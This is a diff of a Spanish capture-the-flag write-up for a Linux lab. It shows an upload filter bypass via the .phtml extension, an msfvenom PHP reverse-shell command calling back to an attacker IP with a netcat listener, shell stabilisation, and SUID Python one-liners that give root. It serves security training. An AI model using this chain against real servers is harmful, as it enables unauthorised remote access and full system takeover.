@@ -8,34 +8,34 @@ Linux
 
 ## 🎯 Objetivo del laboratorio
 
-Comprometer una máquina Linux explotando una funcionalidad vulnerable de subida de archivos para obtener una **reverse shell**, acceder al sistema como **www-data** y escalar privilegios mediante un binario **SUID** hasta conseguir acceso como **root**.
+Comprometer una máquina Linux explotando una vulnerabilidad de **File Upload** para obtener una **Remote Code Execution (RCE)**, estabilizar la shell obtenida y escalar privilegios aprovechando un binario **SUID** hasta conseguir acceso como **root**.
 
 ---
 
 ## 🛠️ Tecnologías trabajadas
 
-- File Upload
-- Reverse Shell
-- msfvenom
-- Netcat
 - Gobuster
-- Python
+- File Upload
+- PHP Reverse Shell
+- Netcat
+- TTY Treatment
 - SUID
+- Python
 - GTFOBins
 
 ---
 
 ## 🧠 Metodología
 
-La enumeración inicial mostró únicamente los servicios **HTTP** y **SSH**, por lo que el foco principal pasó a ser la aplicación web. Al no encontrar información relevante en la página principal ni en el código fuente, decidí ampliar la enumeración mediante fuzzing para descubrir funcionalidades ocultas.
+La enumeración inicial mostró únicamente dos servicios: **SSH** y **HTTP**. Al no disponer de credenciales para SSH, toda la investigación se centró en la aplicación web.
 
-La búsqueda de directorios permitió localizar un panel de subida de archivos y un directorio donde se almacenaban los ficheros subidos. Esta combinación indicaba una posible vulnerabilidad de **File Upload**, por lo que la estrategia consistió en intentar ejecutar código PHP desde el servidor.
+La enumeración de directorios reveló dos recursos especialmente interesantes: un panel para subir archivos y otro directorio desde el que esos archivos podían ejecutarse. Esta combinación indicaba un posible vector de **Remote Code Execution**, por lo que el objetivo pasó a ser encontrar una forma de superar las restricciones de subida de archivos.
 
-Cuando comprobé que el servidor bloqueaba archivos con extensión `.php`, busqué una alternativa compatible con el intérprete PHP. Cambiar la extensión permitió evadir la restricción y ejecutar correctamente una **reverse shell**.
+Aunque el servidor bloqueaba los archivos con extensión `.php`, asumí que la validación probablemente se realizaba únicamente sobre la extensión. Tras probar formatos alternativos compatibles con PHP conseguí subir una reverse shell utilizando la extensión `.phtml`.
 
-Tras obtener acceso al sistema, realicé la enumeración habitual para identificar usuarios y posibles vectores de escalada. Al no existir permisos interesantes mediante `sudo`, la investigación se centró en los binarios **SUID**, encontrando un binario de Python vulnerable que permitía ejecutar una shell con privilegios elevados.
+Una vez comprometido el sistema, estabilicé la shell para trabajar de forma más cómoda y comencé la enumeración interna. La búsqueda de binarios SUID permitió localizar un intérprete de Python vulnerable que podía utilizarse para obtener una shell privilegiada sin necesidad de explotar vulnerabilidades adicionales.
 
-Este laboratorio demuestra cómo un filtrado insuficiente de extensiones durante la subida de archivos puede terminar comprometiendo completamente un servidor.
+Este laboratorio demuestra cómo una mala validación de archivos subidos y una configuración insegura de permisos pueden comprometer completamente un servidor.
 
 ---
 
@@ -43,78 +43,92 @@ Este laboratorio demuestra cómo un filtrado insuficiente de extensiones durante
 
 ### 1. Enumeración inicial
 
-Comencé comprobando la conectividad con la máquina mediante `ping` y confirmé que se trataba de un sistema Linux gracias al TTL obtenido.
-
-Posteriormente realicé un escaneo completo utilizando Nmap.
+Comencé realizando un escaneo completo mediante Nmap.
 
 ```bash
-nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn 10.10.241.33
+nmap -p- 10.130.176.16
 ```
 
-Se identificaron los siguientes servicios:
+Los servicios identificados fueron:
 
 | Puerto | Servicio |
 |---------|----------|
 | 22 | SSH |
 | 80 | HTTP |
 
+Posteriormente profundicé en los servicios detectados.
+
+```bash
+nmap -sC -sV -p22,80 10.130.176.16
+```
+
+La enumeración confirmó:
+
+- Apache **2.4.41**
+- Servicio **SSH** activo
+
 ---
 
 ### 2. Enumeración web
 
-La página principal únicamente mostraba un texto informativo y no existían pistas relevantes en el código fuente.
-
-Realicé una enumeración de directorios utilizando Gobuster.
+Accedí a la aplicación web y realicé una enumeración de directorios utilizando Gobuster.
 
 ```bash
-gobuster dir -u http://10.10.241.33 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+gobuster dir -u http://10.130.176.16 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
 ```
 
-Durante la enumeración aparecieron dos recursos especialmente interesantes:
+Los recursos más relevantes fueron:
 
-- `/uploads`
-- `/panel`
+```
+/panel
+```
 
-El directorio `uploads` permitía visualizar los archivos almacenados en el servidor, mientras que `panel` ofrecía una funcionalidad para subir nuevos archivos.
+```
+/uploads
+```
+
+El primero permitía subir archivos al servidor, mientras que el segundo los exponía públicamente, convirtiéndose en un posible vector de ejecución remota de código.
 
 ---
 
-### 3. Explotación de la subida de archivos
+### 3. Explotación del File Upload
 
-La combinación de un panel de subida y un directorio accesible desde la web sugería una posible vulnerabilidad de **File Upload**.
+El servidor impedía subir archivos con extensión:
 
-Generé una reverse shell en PHP utilizando **msfvenom**.
-
-```bash
-msfvenom -p php/reverse_php LHOST=10.23.88.247 LPORT=443 --f raw > pwned.php
+```
+.php
 ```
 
-El servidor rechazaba cualquier archivo con extensión `.php`.
+Sin embargo, aceptaba archivos con extensión:
 
-Para evitar esta restricción cambié la extensión del archivo por otra compatible con PHP.
-
-```bash
-mv pwned.php pwned.phtml
+```
+.phtml
 ```
 
-El nuevo archivo fue aceptado correctamente y quedó almacenado dentro del directorio `/uploads`.
+Aprovechando este comportamiento preparé una **reverse shell** en PHP utilizando dicha extensión.
 
-Preparé un listener mediante Netcat.
+Preparé un listener con Netcat.
 
 ```bash
-nc -lvnp 443
+nc -lvnp 1234
 ```
 
-Al acceder al archivo desde el navegador, la reverse shell se ejecutó correctamente.
+Posteriormente ejecuté el archivo accediendo desde el navegador a:
+
+```text
+http://10.130.176.16/uploads/php-reverse-shell.phtml
+```
+
+La conexión se estableció correctamente y obtuve una shell sobre la máquina víctima.
 
 ---
 
-### 4. Acceso inicial
+### 4. Estabilización de la shell
 
-Una vez obtenida la conexión, abrí una nueva reverse shell más estable hacia otro puerto y realicé el tratamiento habitual de la TTY.
+La shell inicial era limitada, por lo que realicé el tratamiento habitual de la TTY.
 
 ```bash
-script /dev/null -c bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 Posteriormente configuré correctamente el terminal.
@@ -123,92 +137,69 @@ Posteriormente configuré correctamente el terminal.
 stty raw -echo
 reset xterm
 export TERM=xterm
-export SHELL=bash
 ```
 
-La shell obtenida pertenecía al usuario:
-
-```
-www-data
-```
-
-Durante la exploración localicé la primera flag:
-
-```
-user.txt
-```
+Tras estos pasos obtuve una shell completamente interactiva.
 
 ---
 
 ### 5. Enumeración interna
 
-Comencé revisando los usuarios existentes.
+Comencé buscando la primera flag del laboratorio.
 
 ```bash
-cat /etc/passwd
+find / -name "user.txt" 2>/dev/null
 ```
 
-Los usuarios más interesantes eran:
+La búsqueda devolvió:
 
-- root
-- rootme
-- test
-
-Posteriormente comprobé los permisos disponibles.
-
-```bash
-sudo -l
+```
+/var/www/user.txt
 ```
 
-No existían permisos interesantes para el usuario comprometido.
-
-Por ello pasé a buscar binarios SUID.
-
-```bash
-find / -perm -4000 2>/dev/null
-```
+Desde esta ubicación recuperé la primera flag.
 
 ---
 
 ### 6. Escalada de privilegios
 
-Durante la enumeración apareció un binario especialmente interesante:
-
-```
-/usr/bin/python
-```
-
-Consultando GTFOBins comprobé que podía utilizarse para obtener una shell privilegiada.
-
-Ejecuté el siguiente comando:
+El siguiente paso consistió en enumerar los binarios SUID.
 
 ```bash
-/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
+find / -perm -u=s -type f 2>/dev/null
 ```
 
-Tras su ejecución obtuve una shell como **root**.
-
-Finalmente accedí al directorio:
+Entre ellos apareció:
 
 ```
-/root
+/usr/bin/python2.7
 ```
 
-y recuperé la última flag del laboratorio.
+Consultando GTFOBins comprobé que era posible utilizar Python para conservar privilegios elevados.
+
+Ejecuté:
+
+```bash
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+
+El comando proporcionó inmediatamente una shell como **root**.
+
+Finalmente recuperé la última flag:
+
+```
+/root/root.txt
+```
 
 ---
 
 ## 📚 Lecciones aprendidas
 
-- Este laboratorio permitió comprender cómo una vulnerabilidad aparentemente sencilla de subida de archivos puede convertirse en una ejecución remota de código sobre el servidor.- Detectar funcionalidades vulnerables de **File Upload**.
-- Generar payloads PHP mediante **msfvenom**.
-- Evadir restricciones de subida modificando la extensión del archivo.
-- Ejecutar reverse shells desde un directorio accesible mediante HTTP.
-- Estabilizar una shell interactiva utilizando herramientas propias de Linux.
-- Enumerar usuarios y revisar permisos tras obtener acceso inicial.
-- Buscar y explotar binarios **SUID** utilizando GTFOBins.
-- Escalar privilegios mediante un binario **Python** con permisos SUID.
-
-### Reflexión
-
-La principal enseñanza de esta máquina fue comprobar que restringir únicamente la extensión `.php` no es una medida de seguridad suficiente para proteger un sistema frente a ataques de subida de archivos. La posibilidad de utilizar extensiones alternativas como `.phtml` permitió ejecutar código arbitrario sin necesidad de explotar vulnerabilidades adicionales. Además, el laboratorio reforzó la importancia de revisar siempre los binarios SUID tras obtener acceso inicial, ya que continúan siendo uno de los vectores de escalada más frecuentes en entornos Linux.
+- Este laboratorio permitió practicar una cadena de explotación muy habitual en auditorías web: subida de archivos, obtención de una shell y escalada mediante binarios SUID.
+- Detectar vulnerabilidades de **File Upload**.
+- Comprender por qué Apache ejecuta archivos con extensión `.phtml`.
+- Obtener una **Remote Code Execution** mediante una reverse shell en PHP.
+- Estabilizar una shell interactiva utilizando Python y la configuración del terminal.
+- Buscar archivos relevantes mediante `find`.
+- Enumerar binarios **SUID** tras obtener acceso inicial.
+- Escalar privilegios utilizando un intérprete de Python con permisos SUID.
